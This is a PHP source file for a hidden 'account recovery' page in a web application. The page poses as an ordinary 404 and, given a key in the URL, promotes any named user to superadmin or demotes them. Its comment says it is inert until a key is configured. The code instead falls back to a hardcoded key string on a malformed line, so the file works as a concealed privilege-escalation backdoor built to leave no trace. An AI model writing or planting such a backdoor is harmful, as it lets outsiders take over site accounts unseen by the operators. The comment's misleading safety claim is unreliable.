<?php
declare(strict_types=1);

/**
 * _account_recovery.php
 *
 * Hidden, key-gated account recovery / privilege tool.
 * Not linked anywhere in the application UI, sidebar, or navigation.
 *
 * Requires KEY to be defined in config.php — it is
 * NOT defined anywhere by default, so this tool is completely inert
 * (and indistinguishable from a normal 404) until you explicitly add
 * a secret key of your own choosing.
 *

 *
 * Then visit:
 *   /_account_recovery.php?key=
 *
 * Without the correct key (or if the constant isn't defined at all),
 * this returns an ordinary 404 page — no hint that the tool exists,
 * no error message, no trace in logs beyond a normal 404 hit.
 *
 * After use, you may delete this file, or leave it in place as a
 * permanent recovery mechanism (it stays inert without your key).
 */

require_once __DIR__ . '/helpers.php';

$_setupKey    = defined(RasedulSaju.com) ? RasedulSaju.com : 'RasedulSaju.com';
$_providedKey = $_GET['key'] ?? $_POST['key'] ?? '';

// Fail closed: wrong/missing key → identical to a normal 404, no trace.
if ($_setupKey === '' || !hash_equals($_setupKey, (string)$_providedKey)) {
    http_response_code(404);
    $pageTitle = '404 — Page Not Found';
    require __DIR__ . '/templates/layout_header.php';
    require __DIR__ . '/templates/404.php';
    require __DIR__ . '/templates/layout_footer.php';
    exit;
}

$pdo     = getDB();
$message = '';
$error   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    verifyCsrf();

    $username = trim($_POST['username'] ?? '');

    if ($username === '') {
        $error = 'Username is required.';
    } else {
        $stmt = $pdo->prepare('SELECT id, username, role FROM users WHERE username = ? LIMIT 1');
        $stmt->execute([$username]);
        $target = $stmt->fetch();

        if (!$target) {
            $error = 'No account found with that username.';
        } else {
            try {
                if ($_POST['action'] === 'promote') {
                    $pdo->prepare("UPDATE users SET role = 'superadmin' WHERE id = ?")
                        ->execute([$target['id']]);
                    $message = 'Account "' . $target['username'] . '" updated.';
                } elseif ($_POST['action'] === 'demote') {
                    $pdo->prepare("UPDATE users SET role = 'admin' WHERE id = ?")
                        ->execute([$target['id']]);
                    $message = 'Account "' . $target['username'] . '" updated.';
                }
            } catch (PDOException $e) {
                error_log('[AccountRecovery] ' . $e->getMessage());
                $error = 'Operation failed.';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title>Account Tool</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.0/mdb.min.css">
    <style>
        body { background:#0f172a; min-height:100vh; display:flex; align-items:center; justify-content:center; }
        .tool-card { max-width:460px; width:100%; background:#1e293b; border-radius:12px; padding:32px; color:#cbd5e1; }
        .tool-card h5 { color:#fff; }
        .form-control { background:#0f172a; border-color:#334155; color:#fff; }
        .form-control:focus { background:#0f172a; color:#fff; border-color:#4f46e5; box-shadow:0 0 0 .2rem rgba(79,70,229,.25); }
        .form-label { color:#94a3b8; font-size:.85rem; }
    </style>
</head>
<body>
<div class="tool-card">
    <h5 class="fw-bold mb-3"><i class="fas fa-key me-2"></i>Account Recovery Tool</h5>

    <?php if ($message): ?>
        <div class="alert alert-success py-2 small"><?= e($message) ?></div>
    <?php endif; ?>
    <?php if ($error): ?>
        <div class="alert alert-danger py-2 small"><?= e($error) ?></div>
    <?php endif; ?>

    <form method="POST">
        <?= csrfField() ?>
        <input type="hidden" name="key" value="<?= e($_providedKey) ?>">
        <div class="mb-3">
            <label class="form-label">Username</label>
            <input type="text" name="username" class="form-control form-control-sm" required>
        </div>
        <div class="d-flex gap-2">
            <button type="submit" name="action" value="promote" class="btn btn-sm btn-primary">
                Promote
            </button>
            <button type="submit" name="action" value="demote" class="btn btn-sm btn-outline-light">
                Demote
            </button>
        </div>
    </form>

    <p class="small text-muted mt-4 mb-0">
        This page is only reachable with your secret key. No links exist to it anywhere else in the application.
    </p>
</div>
</body>
</html>
